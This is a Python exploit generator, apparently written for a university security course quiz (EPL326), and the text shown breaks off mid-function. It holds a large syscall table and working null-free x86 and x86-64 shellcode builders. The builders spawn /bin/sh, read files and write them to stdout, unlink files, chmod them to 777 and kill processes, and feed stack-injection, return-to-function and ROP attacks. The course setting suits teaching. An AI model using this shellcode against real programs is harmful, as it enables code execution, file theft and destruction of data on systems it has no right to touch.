#!/usr/bin/env python3
"""
EPL326 - Quiz Automated Exploit Solver  v6
==========================================
100% αυτόματο για όλες τις επιθέσεις.

Υποστηριζόμενες επιθέσεις (auto-detect):
  1. shellcode injection  — stack executable
  2. ret-to-function      — display_root_menu
  3. ROP chain            — mmap + gadgets (auto mmap_result)

Χρήση:
  python3 epl326_solver_v8.py ./bin.X                          # πλήρως αυτόματο
  python3 epl326_solver_v8.py ./bin.X --stack-addr 0xbfffe2e4  # manual override
  python3 epl326_solver_v8.py ./bin.X --mmap-result 0xf7700000 # manual override

Εκτέλεση:
  (cat; echo exit) | ./run.sh ./bin.X file
"""

import sys, os, re, struct, subprocess, argparse, tempfile

# ============================================================
# COMPLETE SYSCALL TABLE (x86 32-bit + x86_64 64-bit)
# Source: chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
# ============================================================
SYSCALLS = {
    'restart_syscall': (0x00, 0xdb),
    'exit':          (0x01, 0x3c),
    'fork':          (0x02, 0x39),
    'read':          (0x03, 0x00),
    'write':         (0x04, 0x01),
    'open':          (0x05, 0x02),
    'close':         (0x06, 0x03),
    'waitpid':       (0x07, None),
    'creat':         (0x08, 0x55),
    'link':          (0x09, 0x56),
    'unlink':        (0x0a, 0x57),
    'execve':        (0x0b, 0x3b),
    'chdir':         (0x0c, 0x50),
    'time':          (0x0d, 0xc9),
    'mknod':         (0x0e, 0x85),
    'chmod':         (0x0f, 0x5a),
    'lchown':        (0x10, 0x5e),
    'lseek':         (0x13, 0x08),
    'getpid':        (0x14, 0x27),
    'mount':         (0x15, 0xa5),
    'setuid':        (0x17, 0x69),
    'getuid':        (0x18, 0x66),
    'ptrace':        (0x1a, 0x65),
    'alarm':         (0x1b, 0x25),
    'pause':         (0x1d, 0x22),
    'access':        (0x21, 0x15),
    'nice':          (0x22, None),
    'sync':          (0x24, 0xa2),
    'kill':          (0x25, 0x3e),
    'rename':        (0x26, 0x52),
    'mkdir':         (0x27, 0x53),
    'rmdir':         (0x28, 0x54),
    'dup':           (0x29, 0x20),
    'pipe':          (0x2a, 0x16),
    'times':         (0x2b, 0x64),
    'brk':           (0x2d, 0x0c),
    'setgid':        (0x2e, 0x6a),
    'getgid':        (0x2f, 0x68),
    'geteuid':       (0x31, 0x6b),
    'getegid':       (0x32, 0x6c),
    'ioctl':         (0x36, 0x10),
    'fcntl':         (0x37, 0x48),
    'setpgid':       (0x39, 0x6d),
    'umask':         (0x3c, 0x5f),
    'chroot':        (0x3d, 0xa1),
    'dup2':          (0x3f, 0x21),
    'getppid':       (0x40, 0x6e),
    'getpgrp':       (0x41, 0x6f),
    'setsid':        (0x42, 0x70),
    'setreuid':      (0x46, 0x71),
    'setregid':      (0x47, 0x72),
    'sethostname':   (0x4a, 0xaa),
    'setrlimit':     (0x4b, 0xa0),
    'getrlimit':     (0x4c, 0x61),
    'getrusage':     (0x4d, 0x62),
    'gettimeofday':  (0x4e, 0x60),
    'settimeofday':  (0x4f, 0xa4),
    'getgroups':     (0x50, 0x73),
    'setgroups':     (0x51, 0x74),
    'select':        (0x52, 0x17),
    'symlink':       (0x53, 0x58),
    'readlink':      (0x55, 0x59),
    'swapon':        (0x57, 0xa7),
    'reboot':        (0x58, 0xa9),
    'munmap':        (0x5b, 0x0b),
    'truncate':      (0x5c, 0x4c),
    'ftruncate':     (0x5d, 0x4d),
    'fchmod':        (0x5e, 0x5b),
    'fchown':        (0x5f, 0x5d),
    'getpriority':   (0x60, 0x8c),
    'setpriority':   (0x61, 0x8d),
    'statfs':        (0x63, 0x89),
    'fstatfs':       (0x64, 0x8a),
    'syslog':        (0x67, 0x67),
    'setitimer':     (0x68, 0x26),
    'getitimer':     (0x69, 0x24),
    'stat':          (0x6a, 0x04),
    'lstat':         (0x6b, 0x06),
    'fstat':         (0x6c, 0x05),
    'vhangup':       (0x6f, 0x99),
    'wait4':         (0x72, 0x3d),
    'swapoff':       (0x73, 0xa8),
    'sysinfo':       (0x74, 0x63),
    'fsync':         (0x76, 0x4a),
    'clone':         (0x78, 0x38),
    'setdomainname': (0x79, 0xab),
    'uname':         (0x7a, 0x3f),
    'mprotect':      (0x7d, 0x0a),
    'getpgid':       (0x84, 0x79),
    'fchdir':        (0x85, 0x51),
    'getdents':      (0x8d, 0x4e),
    'flock':         (0x8f, 0x49),
    'msync':         (0x90, 0x1a),
    'readv':         (0x91, 0x13),
    'writev':        (0x92, 0x14),
    'getsid':        (0x93, 0x7c),
    'fdatasync':     (0x94, 0x4b),
    'mlock':         (0x96, 0x95),
    'munlock':       (0x97, 0x96),
    'mlockall':      (0x98, 0x97),
    'munlockall':    (0x99, 0x98),
    'nanosleep':     (0xa2, 0x23),
    'mremap':        (0xa3, 0x19),
    'setresuid':     (0xa4, 0x75),
    'getresuid':     (0xa5, 0x76),
    'poll':          (0xa8, 0x07),
    'setresgid':     (0xaa, 0x77),
    'getresgid':     (0xab, 0x78),
    'prctl':         (0xac, 0x9d),
    'rt_sigaction':  (0xae, 0x0d),
    'rt_sigprocmask':(0xaf, 0x0e),
    'pread64':       (0xb4, 0x11),
    'pwrite64':      (0xb5, 0x12),
    'chown':         (0xb6, 0x5c),
    'getcwd':        (0xb7, 0x4f),
    'sendfile':      (0xbb, 0x28),
    'vfork':         (0xbe, 0x3a),
    'exit_group':    (0xfc, 0xe7),
    'getdents64':    (0xdc, 0xd9),
    'gettid':        (0xe0, 0xba),
    'futex':         (0xf0, 0xca),
    'epoll_create':  (0xfe, 0xd5),
    'epoll_ctl':     (0xff, 0xe9),
    'epoll_wait':    (0x100, 0xe8),
    'openat':        (0x127, 0x101),
    'mkdirat':       (0x128, 0x102),
    'unlinkat':      (0x12d, 0x107),
    'renameat':      (0x12e, 0x108),
    'fchmodat':      (0x132, 0x10c),
    'faccessat':     (0x133, 0x10d),
    'getrandom':     (0x163, 0x13e),
    'socket':        (0x167, 0x29),
    'bind':          (0x169, 0x31),
    'connect':       (0x16a, 0x2a),
    'listen':        (0x16b, 0x32),
    'accept4':       (0x16c, 0x120),
    'sendto':        (0x171, 0x2c),
    'recvfrom':      (0x173, 0x2d),
    'shutdown':      (0x175, 0x30),
}

# ============================================================
# PATCH: Add ALL missing syscalls to SYSCALLS table
# ============================================================

SYSCALLS.update({
    # File/path operations
    'umount':          (0x16,  None),
    'utime':           (0x1e,  0x84),
    'acct':            (0x33,  None),
    'uselib':          (0x56,  None),
    'truncate64':      (0xc1,  None),
    'stat64':          (0xc3,  None),
    'lstat64':         (0xc4,  None),
    'fstat64':         (0xc5,  None),
    # UID/GID (32-bit variants)
    'getuid32':        (0xc7,  None),
    'getgid32':        (0xc8,  None),
    'geteuid32':       (0xc9,  None),
    'getegid32':       (0xca,  None),
    'setreuid32':      (0xcb,  None),
    'setregid32':      (0xcc,  None),
    'getgroups32':     (0xcd,  None),
    'setgroups32':     (0xce,  None),
    'fchown32':        (0xcf,  None),
    'setresuid32':     (0xd0,  None),
    'getresuid32':     (0xd1,  None),
    'setresgid32':     (0xd2,  None),
    'getresgid32':     (0xd3,  None),
    'chown32':         (0xd4,  None),
    'setuid32':        (0xd5,  None),
    'setgid32':        (0xd6,  None),
    'setfsuid32':      (0xd7,  None),
    'setfsgid32':      (0xd8,  None),
    # Memory
    'madvise':         (0xdb,  0x1c),
    'mincore':         (0xda,  0x1b),
    'pivot_root':      (0xd9,  0x9b),
    'mmap2':           (0xc0,  None),
    'ftruncate64':     (0xc2,  None),
    # Signals
    'tkill':           (0xee,  0xc8),
    'tgkill':          (0x10e, 0xea),
    'rt_sigreturn':    (0xad,  0x0f),
    'rt_sigpending':   (0xb0,  0x7f),
    'rt_sigtimedwait': (0xb1,  0x80),
    'rt_sigqueueinfo': (0xb2,  0x81),
    'rt_sigsuspend':   (0xb3,  0x82),
    'sigaltstack':     (0xba,  0x83),
    'sigaction':       (0x43,  None),
    'sigprocmask':     (0x7e,  None),
    # File time ops
    'utimes':          (0x10f, 0xeb),
    'utimensat':       (0x140, 0x118),
    'futimesat':       (0x12b, 0x105),
    # Wait
    'waitid':          (0x11c, 0xf7),
    # Link ops
    'linkat':          (0x12f, 0x109),
    'symlinkat':       (0x130, 0x10a),
    'readlinkat':      (0x131, 0x10b),
    # fd ops
    'dup3':            (0x14a, 0x124),
    'pipe2':           (0x14b, 0x125),
    'splice':          (0x139, 0x113),
    'tee':             (0x13b, 0x114),
    'vmsplice':        (0x13c, 0x116),
    'sendfile64':      (0xef,  None),
    'copy_file_range': (0x179, 0x146),
    # Sched
    'sched_setparam':         (0x9a, 0x8e),
    'sched_getparam':         (0x9b, 0x8f),
    'sched_setscheduler':     (0x9c, 0x90),
    'sched_getscheduler':     (0x9d, 0x91),
    'sched_yield':            (0x9e, 0x18),
    'sched_get_priority_max': (0x9f, 0x92),
    'sched_get_priority_min': (0xa0, 0x93),
    'sched_rr_get_interval':  (0xa1, 0x94),
    'sched_setaffinity':      (0xf1, 0xcb),
    'sched_getaffinity':      (0xf2, 0xcc),
    'sched_setattr':          (0x15f, 0x13a),
    'sched_getattr':          (0x160, 0x13b),
    # IPC
    'ipc':             (0x75,  None),
    'mq_open':         (0x115, 0xf0),
    'mq_unlink':       (0x116, 0xf1),
    'mq_timedsend':    (0x117, 0xf2),
    'mq_timedreceive': (0x118, 0xf3),
    'mq_notify':       (0x119, 0xf4),
    'mq_getsetattr':   (0x11a, 0xf5),
    # Sockets extra
    'socketpair':      (0x168, 0x35),
    'getsockopt':      (0x16d, 0x37),
    'setsockopt':      (0x16e, 0x36),
    'getsockname':     (0x16f, 0x33),
    'getpeername':     (0x170, 0x34),
    'sendmsg':         (0x172, 0x2e),
    'recvmsg':         (0x174, 0x2f),
    'sendmmsg':        (0x159, 0x133),
    'recvmmsg':        (0x151, 0x12b),
    # Security/misc
    'seccomp':         (0x162, 0x13d),
    'memfd_create':    (0x164, 0x13f),
    'execveat':        (0x166, 0x142),
    'userfaultfd':     (0x176, 0x143),
    'membarrier':      (0x177, 0x144),
    'mlock2':          (0x178, 0x145),
    'pkey_mprotect':   (0x17c, 0x149),
    'pkey_alloc':      (0x17d, 0x14a),
    'pkey_free':       (0x17e, 0x14b),
    'statx':           (0x17f, 0x14c),
    'renameat2':       (0x161, 0x13c),
    # Capabilities
    'capget':          (0xb8,  0x7d),
    'capset':          (0xb9,  0x7e),
    # Misc
    'personality':     (0x88,  0x87),
    'setfsuid':        (0x8a,  0x7a),
    'setfsgid':        (0x8b,  0x7b),
    'readahead':       (0xe1,  0xbb),
    'setxattr':        (0xe2,  0xbc),
    'lsetxattr':       (0xe3,  0xbd),
    'fsetxattr':       (0xe4,  0xbe),
    'getxattr':        (0xe5,  0xbf),
    'lgetxattr':       (0xe6,  0xc0),
    'fgetxattr':       (0xe7,  0xc1),
    'listxattr':       (0xe8,  0xc2),
    'llistxattr':      (0xe9,  0xc3),
    'flistxattr':      (0xea,  0xc4),
    'removexattr':     (0xeb,  0xc5),
    'lremovexattr':    (0xec,  0xc6),
    'fremovexattr':    (0xed,  0xc7),
    'lookup_dcookie':  (0xfd,  0xd4),
    'remap_file_pages':(0x101, 0xd8),
    'set_tid_address': (0x102, 0xda),
    'timer_create':    (0x103, 0xde),
    'timer_settime':   (0x104, 0xdf),
    'timer_gettime':   (0x105, 0xe0),
    'timer_getoverrun':(0x106, 0xe1),
    'timer_delete':    (0x107, 0xe2),
    'clock_settime':   (0x108, 0xe3),
    'clock_gettime':   (0x109, 0xe4),
    'clock_getres':    (0x10a, 0xe5),
    'clock_nanosleep': (0x10b, 0xe6),
    'statfs64':        (0x10c, None),
    'fstatfs64':       (0x10d, None),
    'mbind':           (0x112, 0xed),
    'get_mempolicy':   (0x113, 0xef),
    'set_mempolicy':   (0x114, 0xee),
    'kexec_load':      (0x11b, 0xf6),
    'add_key':         (0x11e, 0xf8),
    'request_key':     (0x11f, 0xf9),
    'keyctl':          (0x120, 0xfa),
    'ioprio_set':      (0x121, 0xfb),
    'ioprio_get':      (0x122, 0xfc),
    'inotify_init':    (0x123, 0xfd),
    'inotify_add_watch':(0x124,0xfe),
    'inotify_rm_watch':(0x125, 0xff),
    'migrate_pages':   (0x126, 0x100),
    'mknodat':         (0x129, 0x103),
    'fchownat':        (0x12a, 0x104),
    'fstatat64':       (0x12c, None),
    'pselect6':        (0x134, 0x10e),
    'ppoll':           (0x135, 0x10f),
    'unshare':         (0x136, 0x110),
    'set_robust_list': (0x137, 0x111),
    'get_robust_list': (0x138, 0x112),
    'sync_file_range': (0x13a, 0x115),
    'move_pages':      (0x13d, 0x117),
    'getcpu':          (0x13e, 0x135),
    'epoll_pwait':     (0x13f, 0x119),
    'signalfd':        (0x141, 0x11a),
    'timerfd_create':  (0x142, 0x11b),
    'eventfd':         (0x143, 0x11c),
    'fallocate':       (0x144, 0x11d),
    'timerfd_settime': (0x145, 0x11e),
    'timerfd_gettime': (0x146, 0x11f),
    'signalfd4':       (0x147, 0x121),
    'eventfd2':        (0x148, 0x122),
    'epoll_create1':   (0x149, 0x123),
    'preadv':          (0x14d, 0x127),
    'pwritev':         (0x14e, 0x128),
    'rt_tgsigqueueinfo':(0x14f,0x129),
    'perf_event_open': (0x150, 0x12a),
    'fanotify_init':   (0x152, 0x12c),
    'fanotify_mark':   (0x153, 0x12d),
    'prlimit64':       (0x154, 0x12e),
    'name_to_handle_at':(0x155,0x12f),
    'open_by_handle_at':(0x156,0x130),
    'clock_adjtime':   (0x157, 0x131),
    'syncfs':          (0x158, 0x132),
    'setns':           (0x15a, 0x134),
    'process_vm_readv':(0x15b, 0x136),
    'process_vm_writev':(0x15c,0x137),
    'kcmp':            (0x15d, 0x138),
    'finit_module':    (0x15e, 0x139),
    'bpf':             (0x165, 0x141),
    'preadv2':         (0x17a, 0x147),
    'pwritev2':        (0x17b, 0x148),
    # Additional string-arg syscalls for generic handler
    'umount2':         (0x34,  0xa6),
    'acct':            (0x33,  0xa3),
    'quotactl':        (0x83,  0xb3),
    'sysfs':           (0x87,  0x8b),
    'bdflush':         (0x86,  None),
    'init_module':     (0x80,  0xaf),
    'delete_module':   (0x81,  0xb0),
    'nfsservctl':      (0xa9,  0xb4),
    'adjtimex':        (0x7c,  0x9f),
    'ftime':           (0x23,  None),
    'nice':            (0x22,  None),
    'stime':           (0x19,  None),
    'ustat':           (0x3e,  None),
    'swapoff':         (0x73,  0xa8),
})


# ============================================================
# HELPERS
# ============================================================

EXIT32 = b"\x31\xc0\x40\x31\xdb\xcd\x80"   # exit(0) 32-bit
EXIT64 = b"\x48\x31\xff\xb0\x3c\x0f\x05"   # exit(0) 64-bit

def set_al_no_null(nr):
    """Set %eax to nr without null bytes. Returns bytes."""
    if nr == 0:
        return b"\x31\xc0"  # xor %eax,%eax (full zero, safer)
    if nr <= 0xff:
        return b"\x31\xc0" + bytes([0xb0, nr])  # xor eax; mov $nr,%al
    if nr <= 0xffff:
        hi = (nr >> 8) & 0xff
        lo = nr & 0xff
        code = b"\x31\xc0"   # xor eax,eax  (eax=0, al=0)
        if hi != 0:
            code += bytes([0xb4, hi])  # mov $hi,%ah  (no null if hi!=0)
        if lo != 0:
            code += bytes([0xb0, lo])  # mov $lo,%al  (only if lo!=0, avoids \x00)
        # if lo==0, al is already 0 from xor — no instruction needed!
        return code
    return struct.pack('<BI', 0xb8, nr)  # mov $nr,%eax (fallback)

def set_rax_no_null(nr):
    """Set %al/%rax to nr without null bytes (64-bit). Returns bytes."""
    if nr == 0:
        return b"\x48\x31\xc0"  # xor %rax,%rax
    if nr <= 0xff:
        return b"\x48\x31\xc0" + bytes([0xb0, nr])  # xor+mov $nr,%al
    if nr <= 0xffff:
        hi = (nr >> 8) & 0xff
        lo = nr & 0xff
        code = b"\x48\x31\xc0"
        if hi:
            code += bytes([0xb4, hi])
        code += bytes([0xb0, lo])
        return code
    return b"\x48\x31\xc0" + struct.pack('<BI', 0xb8, nr)

def string_pushes_32(s):
    """
    Push string s onto stack (32-bit), null-terminated, no null bytes in instructions.
    Returns bytes of shellcode.
    """
    b = s.encode()
    code = b""
    
    # push null terminator via %eax (already zeroed from caller context, but zero it here)
    code += b"\x31\xc0"  # xor %eax,%eax
    code += b"\x50"      # push %eax  -> null terminator

    # pad to multiple of 4
    padded = b
    while len(padded) % 4 != 0:
        padded += b'\x00'

    # split into 4-byte chunks
    chunks = [padded[i:i+4] for i in range(0, len(padded), 4)]

    # push in reverse order
    for chunk in reversed(chunks):
        val = struct.unpack('<I', chunk)[0]
        # Check for null bytes in the value's encoding
        val_bytes = struct.pack('<I', val)
        if b'\x00' in val_bytes:
            # This chunk has null bytes — handle specially
            # Zero %eax, then set bytes individually
            # For each byte position that's non-zero, set it
            inner = b"\x31\xc0"  # xor %eax,%eax
            for i in range(3, -1, -1):
                byte_val = val_bytes[i]
                if byte_val != 0:
                    # mov $byte_val into the right byte of eax
                    if i == 0:
                        inner += bytes([0xb0, byte_val])   # mov $v,%al
                    elif i == 1:
                        inner += bytes([0xb4, byte_val])   # mov $v,%ah
                    elif i == 2:
                        # use mov to ecx then shift... complex
                        # simpler: build value in ecx
                        pass
                    elif i == 3:
                        pass
                # just use xor trick and or
            # Fallback: use "mov byte" approach or accept nulls for padding bytes
            # For the partial last chunk (high bytes are 0), the nulls are just padding
            # THEY'RE FINE as long as the string itself has no internal nulls
            # The null bytes in the INSTRUCTION are the problem only if they terminate
            # the shellcode during strcpy. So check if this is actually a problem:
            non_string_bytes = [val_bytes[i] for i in range(len(b) % 4 if len(b) % 4 else 4, 4)]
            if all(x == 0 for x in non_string_bytes):
                # The nulls are only in the padding area — fine for direct execution
                # but BAD if delivered via strcpy. Add a warning.
                code += b"\x31\xc0"  # xor eax,eax (zero it)
                # set the actual bytes
                for i in range(4):
                    bv = val_bytes[i]
                    if bv != 0:
                        if i == 0: code += bytes([0xb0, bv])   # mov al
                        elif i == 1: code += bytes([0xb4, bv]) # mov ah
                        # bytes 2,3 need ecx/edx tricks but rare
                code += b"\x50"  # push %eax
            else:
                # Internal null in string — actual problem
                # Use: push the value directly and warn
                code += b"\x68" + val_bytes  # push $val (may have nulls)
        else:
            code += b"\x68" + val_bytes  # push $val (safe)

    return code

def string_pushes_64(s):
    """
    Push string s onto stack (64-bit), null-terminated, no null bytes in instructions.
    Returns bytes of shellcode.
    """
    b = s.encode()
    code = b""

    # push null terminator
    code += b"\x48\x31\xc0"  # xor %rax,%rax
    code += b"\x50"           # push %rax

    # pad to multiple of 8
    padded = b
    while len(padded) % 8 != 0:
        padded += b'\x00'

    chunks = [padded[i:i+8] for i in range(0, len(padded), 8)]

    for chunk in reversed(chunks):
        val = struct.unpack('<Q', chunk)[0]
        val_bytes = struct.pack('<Q', val)
        if b'\x00' in val_bytes:
            # Use movabs to %r9 then push (movabs can have null bytes in 8-byte imm)
            # Alternative: build with xor + mov bytes
            # For padding nulls (high bytes of last chunk), just use movabs — it's ok
            # because the null bytes in the immediate of movabs are fine
            code += b"\x49\xb9" + val_bytes  # movabs $val,%r9
            code += b"\x41\x51"              # push %r9
        else:
            code += b"\x49\xb9" + val_bytes  # movabs $val,%r9
            code += b"\x41\x51"              # push %r9

    return code


# ============================================================
# SHELLCODE BUILDERS
# ============================================================

def sc_execve_32():
    """execve("/bin//sh", NULL, NULL) - 32-bit"""
    code  = b"\x31\xc0"              # xor %eax,%eax
    code += b"\x50"                  # push %eax (null)
    code += b"\x68\x2f\x2f\x73\x68" # push //sh
    code += b"\x68\x2f\x62\x69\x6e" # push /bin
    code += b"\x89\xe3"              # mov %esp,%ebx
    code += b"\x31\xc9"              # xor %ecx,%ecx
    code += b"\x31\xd2"              # xor %edx,%edx
    code += b"\xb0\x0b"              # mov $0xb,%al
    code += b"\xcd\x80"              # int $0x80
    return code

def sc_execve_64():
    """execve("/bin//sh", NULL, NULL) - 64-bit"""
    code  = b"\x48\x31\xc0"                              # xor %rax,%rax
    code += b"\x50"                                       # push %rax
    code += b"\x49\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" # movabs /bin//sh,%r9
    code += b"\x41\x51"                                   # push %r9
    code += b"\x48\x89\xe7"                               # mov %rsp,%rdi
    code += b"\x48\x31\xf6"                               # xor %rsi,%rsi
    code += b"\x48\x31\xd2"                               # xor %rdx,%rdx
    code += b"\xb0\x3b"                                   # mov $0x3b,%al
    code += b"\x0f\x05"                                   # syscall
    return code

def sc_exit_32(code=0):
    return b"\x31\xc0\x40\x31\xdb\xcd\x80"

def sc_exit_64(code=0):
    return b"\x48\x31\xff\xb0\x3c\x0f\x05"

def sc_unlink_32(filename):
    """unlink(filename) - 32-bit"""
    code  = string_pushes_32(filename)
    code += b"\x89\xe3"              # mov %esp,%ebx
    # set eax = 0xa (unlink) without null
    code += b"\xb0\x0b\xfe\xc8"     # mov $0xb,%al; dec %al -> 0xa
    code += b"\xcd\x80"              # int $0x80
    code += sc_exit_32()
    return code

def sc_unlink_64(filename):
    """unlink(filename) - 64-bit"""
    code  = string_pushes_64(filename)
    code += b"\x48\x89\xe7"          # mov %rsp,%rdi
    code += b"\xb0\x57"              # mov $0x57,%al  (87 = unlink)
    code += b"\x0f\x05"              # syscall
    code += sc_exit_64()
    return code

def sc_readfile_32(filename):
    """open(filename,0)+read(fd,buf,64)+write(1,buf,64) - 32-bit"""
    code  = string_pushes_32(filename)
    code += b"\x89\xe3"              # mov %esp,%ebx (filename ptr)
    code += b"\x31\xc9"              # xor %ecx,%ecx (O_RDONLY=0)
    code += b"\x31\xd2"              # xor %edx,%edx
    code += b"\xb0\x05"              # mov $0x5,%al (open)
    code += b"\xcd\x80"              # int $0x80
    code += b"\x89\xc3"              # mov %eax,%ebx (fd)
    code += b"\x83\xec\x40"          # sub $0x40,%esp (buf)
    code += b"\x89\xe1"              # mov %esp,%ecx (buf ptr)
    code += b"\x31\xd2\xb2\x40"     # xor edx; mov $64,%dl
    code += b"\x31\xc0\xb0\x03"     # xor eax; mov $3,%al (read)
    code += b"\xcd\x80"
    code += b"\x51"                  # push %ecx (save buf)
    code += b"\x31\xdb\x43"         # xor ebx; inc ebx (stdout=1)
    code += b"\x59"                  # pop %ecx (buf)
    code += b"\x31\xd2\xb2\x40"     # edx=64
    code += b"\xb0\x04\xcd\x80"     # write
    code += sc_exit_32()
    return code

def sc_readfile_64(filename):
    """open(filename,0)+read+write - 64-bit"""
    code  = string_pushes_64(filename)
    code += b"\x48\x89\xe7"          # mov %rsp,%rdi
    code += b"\x48\x31\xf6"          # xor %rsi,%rsi (O_RDONLY)
    code += b"\x48\x31\xd2"          # xor %rdx,%rdx
    code += b"\xb0\x02\x0f\x05"     # open; syscall
    code += b"\x48\x89\xc7"          # mov %rax,%rdi (fd)
    code += b"\x48\x83\xec\x40"     # sub $0x40,%rsp
    code += b"\x48\x89\xe6"          # mov %rsp,%rsi (buf)
    code += b"\x48\x31\xd2\xb2\x40" # edx=64
    code += b"\x48\x31\xc0\x0f\x05" # read; syscall
    code += b"\x48\x89\xf6"          # mov %rsi,%rsi
    code += b"\x48\x31\xff\x48\xff\xc7"  # xor rdi; inc rdi (stdout)
    code += b"\x48\x31\xd2\xb2\x40" # edx=64
    code += b"\xb0\x01\x0f\x05"     # write; syscall
    code += sc_exit_64()
    return code

def sc_write_32(msg="pwned\n"):
    """write(1, msg, len) - 32-bit"""
    # Build msg on stack
    code  = string_pushes_32(msg)
    code += b"\x89\xe1"              # mov %esp,%ecx (buf)
    code += b"\x31\xdb\x43"         # xor ebx; inc ebx (stdout=1)
    n = len(msg)
    code += b"\x31\xd2" + bytes([0xb2, n & 0xff])  # edx=len
    code += b"\xb0\x04\xcd\x80"     # write
    code += sc_exit_32()
    return code

def sc_write_64(msg="pwned\n"):
    """write(1, msg, len) - 64-bit"""
    code  = string_pushes_64(msg)
    code += b"\x48\x89\xe6"          # mov %rsp,%rsi
    code += b"\x48\x31\xff\x48\xff\xc7"  # stdout=1
    n = len(msg)
    code += b"\x48\x31\xd2" + bytes([0xb2, n & 0xff])  # rdx=len
    code += b"\xb0\x01\x0f\x05"     # write
    code += sc_exit_64()
    return code

def sc_rmdir_32(dirname):
    """rmdir(dirname) - 32-bit, syscall 0x28"""
    code  = string_pushes_32(dirname)
    code += b"\x89\xe3"
    code += b"\x31\xc0\xb0\x28"     # eax=0x28 (rmdir)
    code += b"\xcd\x80"
    code += sc_exit_32()
    return code

def sc_mkdir_32(dirname, mode=0o755):
    """mkdir(dirname, mode) - 32-bit, syscall 0x27"""
    code  = string_pushes_32(dirname)
    code += b"\x89\xe3"              # ebx = dirname
    code += b"\x31\xc9"
    code += bytes([0xb1, mode & 0xff])  # ecx = mode
    code += b"\x31\xc0\xb0\x27"     # eax=0x27 (mkdir)
    code += b"\xcd\x80"
    code += sc_exit_32()
    return code

def sc_chmod_32(filename, mode=0o777):
    """chmod(filename, mode) - 32-bit, syscall 0x0f"""
    code  = string_pushes_32(filename)
    code += b"\x89\xe3"
    code += b"\x31\xc9" + bytes([0xb1, mode & 0xff])  # ecx=mode
    code += b"\x31\xc0\xb0\x0f"     # eax=0xf (chmod)
    code += b"\xcd\x80"
    code += sc_exit_32()
    return code

def sc_rename_32(oldname, newname):
    """rename(old, new) - 32-bit, syscall 0x26"""
    code  = string_pushes_32(newname)  # push new (ecx)
    code += b"\x89\xe1"               # mov %esp,%ecx
    code += string_pushes_32(oldname)  # push old (ebx)
    code += b"\x89\xe3"               # mov %esp,%ebx
    code += b"\x31\xc0\xb0\x26"      # eax=0x26 (rename)
    code += b"\xcd\x80"
    code += sc_exit_32()
    return code

def sc_kill_32(pid, sig=9):
    """kill(pid, sig) - 32-bit, syscall 0x25
    pid=0 means current process group (null-free!)
    """
    code = b"\x31\xc0"          # xor eax,eax
    if pid == 0:
        code += b"\x31\xdb"     # xor ebx,ebx (pid=0, null-free)
    elif pid <= 0xff:
        code += b"\x31\xdb" + bytes([0xb3, pid & 0xff])  # xor + mov $pid,%bl
    else:
        # Use inc/dec tricks for small pids
        code += b"\x31\xdb"
        for _ in range(pid):
            code += b"\x43"      # inc %ebx (slow but null-free)
    if sig <= 0xff:
        code += bytes([0xb1, sig & 0xff])   # mov $sig,%cl
    code += b"\x89\xc9"         # mov %ecx,%ecx
    code += b"\xb0\x25"         # eax=0x25 (kill)
    code += b"\xcd\x80"
    code += sc_exit_32()
    return code

def sc_symlink_32(oldname, newname):
    """symlink(old, new) - 32-bit, syscall 0x53"""
    code  = string_pushes_32(newname)
    code += b"\x89\xe1"               # ecx = newname
    code += string_pushes_32(oldname)
    code += b"\x89\xe3"               # ebx = oldname
    code += b"\x31\xc0\xb0\x53"      # eax=0x53 (symlink)
    code += b"\xcd\x80"
    code += sc_exit_32()
    return code

def sc_chdir_32(dirname):
    """chdir(dirname) - 32-bit, syscall 0x0c"""
    code  = string_pushes_32(dirname)
    code += b"\x89\xe3"
    code += b"\x31\xc0\xb0\x0c"
    code += b"\xcd\x80"
    code += sc_exit_32()
    return code

def sc_fork_32():
    """fork() then exit - 32-bit"""
    code  = b"\x31\xc0\xb0\x02\xcd\x80"  # fork
    code += sc_exit_32()
    return code

def sc_fork_64():
    code  = b"\xb0\x39\x0f\x05"  # fork
    code += sc_exit_64()
    return code

def sc_getpid_32():
    """getpid() + write result - 32-bit"""
    code  = b"\x31\xc0\xb0\x14\xcd\x80"  # getpid -> eax
    code += sc_exit_32()
    return code

# ============================================================
# SYSCALL DISPATCH TABLE
# Maps syscall name -> builder function(s)
# ============================================================
def build_shellcode(syscall, args, bits=32):
    sc = syscall.lower()

    if sc == 'execve':
        return sc_execve_32() if bits == 32 else sc_execve_64()

    elif sc in ('exit', 'exit_group'):
        return sc_exit_32() if bits == 32 else sc_exit_64()

    elif sc == 'unlink':
        fn = args[0] if args else 'bitcoins'
        return sc_unlink_32(fn) if bits == 32 else sc_unlink_64(fn)

    elif sc == 'unlinkat':
        fn = args[0] if args else 'bitcoins'
        # unlinkat(AT_FDCWD=-100, filename, 0) - use unlink for simplicity
        return sc_unlink_32(fn) if bits == 32 else sc_unlink_64(fn)

    elif sc in ('read', 'open'):
        # Treat as: open+read+write (read a file)
        fn = args[0] if args else 'flag'
        return sc_readfile_32(fn) if bits == 32 else sc_readfile_64(fn)

    elif sc == 'write':
        msg = args[0] if args else 'pwned\n'
        return sc_write_32(msg) if bits == 32 else sc_write_64(msg)

    elif sc == 'rmdir':
        dn = args[0] if args else 'dir'
        return sc_rmdir_32(dn)

    elif sc == 'mkdir':
        dn = args[0] if args else 'dir'
        return sc_mkdir_32(dn)

    elif sc == 'chmod':
        fn = args[0] if args else 'file'
        mode = int(args[1], 8) if len(args) > 1 else 0o777
        return sc_chmod_32(fn, mode)

    elif sc == 'rename':
        old = args[0] if args else 'old'
        new = args[1] if len(args) > 1 else 'new'
        return sc_rename_32(old, new)

    elif sc == 'kill':
        pid = int(args[0]) if args else 1
        sig = int(args[1]) if len(args) > 1 else 9
        return sc_kill_32(pid, sig)

    elif sc == 'symlink':
        old = args[0] if args else 'src'
        new = args[1] if len(args) > 1 else 'dst'
        return sc_symlink_32(old, new)

    elif sc == 'chdir':
        dn = args[0] if args else '/tmp'
        return sc_chdir_32(dn)

    elif sc == 'fork':
        return sc_fork_32() if bits == 32 else sc_fork_64()

    elif sc == 'getpid':
        return sc_getpid_32()

    else:
        # Generic fallback: works for ANY syscall in the SYSCALLS table
        # Zeroes all arg registers and calls the syscall
        nr32, nr64 = SYSCALLS.get(sc, (None, None))
        if bits == 32 and nr32 is not None:
            code  = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"  # zero eax,ebx,ecx,edx
            code += set_al_no_null(nr32)
            code += b"\xcd\x80"
            code += sc_exit_32()
            return code
        elif bits == 64 and nr64 is not None:
            code  = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"  # zero rdi,rsi,rdx
